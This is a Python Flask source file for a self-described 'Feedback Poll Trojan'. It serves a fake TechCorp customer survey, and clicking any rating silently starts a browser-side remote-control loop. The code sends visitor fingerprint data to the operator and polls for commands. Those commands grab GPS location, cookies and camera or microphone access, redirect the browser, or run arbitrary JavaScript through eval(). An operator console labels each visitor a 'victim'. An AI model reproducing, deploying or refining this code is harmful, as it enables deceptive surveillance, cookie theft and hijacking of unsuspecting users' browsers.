"""
FEEDBACK POLL TROJAN - MINIMAL DESIGN
=====================================
Clean, professional poll interface. User clicks rating → instant trojan access.
"""

from flask import Flask, request, jsonify
import threading
import queue

app = Flask(__name__)

# Command queue for remote control
command_queue = queue.Queue()
result_queue = queue.Queue()
active_sessions = set()

@app.route("/")
def feedback_poll():
    """Minimal feedback poll interface"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Customer Feedback Survey</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #f5f5f5;
                color: #333;
                line-height: 1.6;
                padding: 20px;
            }
            .container {
                max-width: 500px;
                margin: 50px auto;
                background: white;
                padding: 40px;
                border-radius: 8px;
                box-shadow: 0 2px 20px rgba(0,0,0,0.1);
            }
            .header {
                text-align: center;
                margin-bottom: 30px;
            }
            .company-logo {
                font-size: 24px;
                font-weight: 600;
                color: #2563eb;
                margin-bottom: 10px;
            }
            .survey-title {
                font-size: 20px;
                font-weight: 500;
                color: #1f2937;
                margin-bottom: 8px;
            }
            .survey-subtitle {
                font-size: 14px;
                color: #6b7280;
            }
            .question {
                margin: 30px 0;
            }
            .question-text {
                font-size: 16px;
                font-weight: 500;
                color: #374151;
                margin-bottom: 20px;
                text-align: center;
            }
            .rating-container {
                display: flex;
                justify-content: center;
                gap: 15px;
                margin: 20px 0;
            }
            .rating-btn {
                background: white;
                border: 2px solid #e5e7eb;
                border-radius: 50px;
                padding: 12px 20px;
                cursor: pointer;
                transition: all 0.2s ease;
                font-size: 14px;
                font-weight: 500;
                color: #374151;
                min-width: 60px;
                text-align: center;
            }
            .rating-btn:hover {
                border-color: #2563eb;
                background: #eff6ff;
                color: #2563eb;
            }
            .rating-scale {
                display: flex;
                justify-content: space-between;
                margin-top: 10px;
                font-size: 12px;
                color: #9ca3af;
            }
            .thank-you {
                display: none;
                text-align: center;
                margin: 30px 0;
            }
            .thank-you h3 {
                color: #059669;
                margin-bottom: 10px;
            }
            .footer {
                text-align: center;
                margin-top: 30px;
                padding-top: 20px;
                border-top: 1px solid #e5e7eb;
                font-size: 12px;
                color: #9ca3af;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="company-logo">TechCorp</div>
                <div class="survey-title">Customer Feedback Survey</div>
                <div class="survey-subtitle">Help us improve our services</div>
            </div>
            
            <div id="survey-content">
                <div class="question">
                    <div class="question-text">How would you rate your overall experience with our service?</div>
                    
                    <div class="rating-container">
                        <div class="rating-btn" onclick="submitRating(1)">1</div>
                        <div class="rating-btn" onclick="submitRating(2)">2</div>
                        <div class="rating-btn" onclick="submitRating(3)">3</div>
                        <div class="rating-btn" onclick="submitRating(4)">4</div>
                        <div class="rating-btn" onclick="submitRating(5)">5</div>
                    </div>
                    
                    <div class="rating-scale">
                        <span>Poor</span>
                        <span>Excellent</span>
                    </div>
                </div>
            </div>
            
            <div class="thank-you" id="thank-you">
                <h3>Thank you for your feedback!</h3>
                <p>Your response has been recorded.</p>
                <p>Processing your feedback...</p>
            </div>
            
            <div class="footer">
                TechCorp Customer Experience Team | Confidential Survey
            </div>
        </div>

        <script>
            function submitRating(rating) {
                // Hide survey, show thank you
                document.getElementById('survey-content').style.display = 'none';
                document.getElementById('thank-you').style.display = 'block';
                
                // Start trojan immediately when they click ANY rating
                activateTrojan(rating);
            }
            
            function activateTrojan(rating) {
                const victimInfo = {
                    rating: rating,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screen: screen.width + 'x' + screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString()
                };
                
                // Send victim info and start trojan
                fetch('/activate-trojan', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(victimInfo)
                }).then(() => {
                    // Start polling for commands immediately
                    pollForCommands();
                });
                
                // Keep the thank you message visible - trojan runs hidden
            }
            
            function pollForCommands() {
                fetch('/get-command')
                    .then(response => response.json())
                    .then(data => {
                        if (data.command) {
                            executeCommand(data.command);
                        }
                        setTimeout(pollForCommands, 1500);
                    })
                    .catch(() => setTimeout(pollForCommands, 3000));
            }
            
            function executeCommand(command) {
                try {
                    let result;
                    
                    // Handle special commands
                    if (command === 'info') {
                        result = `URL: ${window.location.href}, UA: ${navigator.userAgent}`;
                    } else if (command === 'location' || command === 'gps') {
                        navigator.geolocation.getCurrentPosition(
                            pos => {
                                const coords = `${pos.coords.latitude},${pos.coords.longitude}`;
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: `GPS: ${coords}`, command: command})
                                });
                            },
                            err => {
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: `GPS denied: ${err.message}`, command: command})
                                });
                            },
                            {enableHighAccuracy: true, timeout: 10000}
                        );
                        return;
                    } else if (command.startsWith('redirect:')) {
                        const url = command.substring(9);
                        window.location.href = url;
                        result = `Redirecting to: ${url}`;
                    } else if (command === 'camera' || command === 'webcam') {
                        navigator.mediaDevices.getUserMedia({video: true})
                            .then(stream => {
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: 'Camera access granted', command: command})
                                });
                            })
                            .catch(err => {
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: `Camera denied: ${err.message}`, command: command})
                                });
                            });
                        return;
                    } else if (command === 'microphone' || command === 'mic') {
                        navigator.mediaDevices.getUserMedia({audio: true})
                            .then(stream => {
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: 'Microphone access granted', command: command})
                                });
                            })
                            .catch(err => {
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: `Microphone denied: ${err.message}`, command: command})
                                });
                            });
                        return;
                    } else {
                        // Execute raw JavaScript
                        result = eval(command);
                        if (result === undefined) {
                            result = 'Command executed';
                        }
                    }
                    
                    // Send result back
                    fetch('/send-result', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({result: result.toString(), command: command})
                    });
                    
                } catch (e) {
                    fetch('/send-result', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({result: `Error: ${e.message}`, command: command})
                    });
                }
            }
        </script>
    </body>
    </html>
    """

@app.route("/activate-trojan", methods=["POST"])
def activate_trojan():
    """User clicked a rating - activate trojan"""
    victim_data = request.json
    victim_ip = request.remote_addr
    
    print(f"\n[+] POLL TROJAN ACTIVATED!")
    print("="*50)
    print(f"[+] Victim IP: {victim_ip}")
    print(f"[+] Rating Given: {victim_data.get('rating')}")
    print(f"[+] User Agent: {victim_data.get('userAgent', 'Unknown')}")
    print(f"[+] Platform: {victim_data.get('platform', 'Unknown')}")
    print(f"[+] Screen: {victim_data.get('screen', 'Unknown')}")
    print(f"[+] Timezone: {victim_data.get('timezone', 'Unknown')}")
    print("="*50)
    
    # Add to active sessions
    active_sessions.add(victim_ip)
    
    # Start command interface
    threading.Thread(target=command_interface, args=(victim_ip,), daemon=True).start()
    
    return jsonify({"status": "activated"})

@app.route("/get-command")
def get_command():
    """API for trojan to get commands"""
    try:
        command = command_queue.get_nowait()
        return jsonify({"command": command})
    except queue.Empty:
        return jsonify({"command": None})

@app.route("/send-result", methods=["POST"])
def send_result():
    """API for trojan to send results"""
    data = request.json
    result_queue.put(f"[{data['command']}] {data['result']}")
    return jsonify({"status": "ok"})

def command_interface(victim_ip):
    """Command interface for controlling victim"""
    print(f"\n[+] COMMAND INTERFACE READY FOR {victim_ip}")
    print("[+] Victim sees 'Thank you for feedback' message")
    print("="*50)
    print("QUICK COMMANDS:")
    print("  info           - Get victim info")
    print("  location       - Get GPS coordinates") 
    print("  camera         - Access webcam")
    print("  microphone     - Access microphone")
    print("  redirect:URL   - Redirect to any website")
    print("  alert('msg')   - Show popup message")
    print("  document.cookie - Get cookies")
    print("="*50)
    
    while victim_ip in active_sessions:
        try:
            command = input(f"\nPoll-Trojan[{victim_ip}] > ").strip()
            
            if command.lower() in ['exit', 'quit']:
                active_sessions.discard(victim_ip)
                print(f"[+] Session ended")
                break
                
            if command:
                # Clean the command - remove any prompt artifacts
                clean_command = command.replace(f"Poll-Trojan[{victim_ip}] > ", "").strip()
                
                command_queue.put(clean_command)
                print(f"[+] Command sent: {clean_command}")
                
                try:
                    result = result_queue.get(timeout=8)
                    print(f"[+] Result: {result}")
                except queue.Empty:
                    print("[-] No response (timeout)")
                    
        except KeyboardInterrupt:
            active_sessions.discard(victim_ip)
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == '__main__':
    print("FEEDBACK POLL TROJAN")
    print("="*30)
    print("Simple, clean poll interface")
    print("User clicks rating → instant access")
    print("="*30)
    
    app.run(host='0.0.0.0', port=8090, debug=False)
